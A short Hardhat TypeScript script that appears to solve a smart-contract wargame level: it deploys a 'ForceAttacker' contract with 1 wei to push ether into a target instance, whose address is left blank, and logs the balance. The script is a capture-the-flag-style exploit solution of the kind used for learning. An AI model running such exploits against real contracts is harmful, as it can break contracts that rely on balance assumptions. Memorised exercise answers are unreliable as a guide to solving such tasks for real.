import { ethers } from "hardhat";
import * as fs from 'fs';
import { privateKey, rpc } from "../hardhat.config";

const instanceAddress = ''

const main = async () =>  {
    let tx;
  
    const provider = new ethers.JsonRpcProvider(rpc);
    const signer = new ethers.Wallet(privateKey, provider);

    console.log("Hacking the contract...");

    const metadata = JSON.parse(fs.readFileSync('./artifacts/contracts/attackers/ForceAttacker.sol/ForceAttacker.json').toString());
    const factory = new ethers.ContractFactory(metadata.abi, metadata.bytecode, signer);
    const contract = await factory.deploy(instanceAddress, { value: 1});
    await contract.deploymentTransaction()?.wait();

    const balance = await provider.getBalance(instanceAddress);

    console.log("Successfully hacked!");
    console.log("Contract balance:", balance);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});